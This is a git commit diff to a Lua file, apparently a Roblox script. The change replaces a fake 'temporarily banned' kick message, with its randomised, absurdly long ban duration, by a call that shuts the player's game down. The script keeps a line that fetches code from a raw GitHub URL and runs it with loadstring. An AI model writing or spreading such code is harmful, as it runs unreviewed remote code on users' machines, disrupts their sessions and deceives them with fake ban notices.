7b3b00a073897c56b127f4479f9ce029e3a9f7c0
Hshshahshsh <110442121+Hshshahshsh@users.noreply.github.com>
2022-12-20 16:42:47 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,4 +1,2 @@
-lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
-end
-
+game:shutdown()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Main.lua"))()
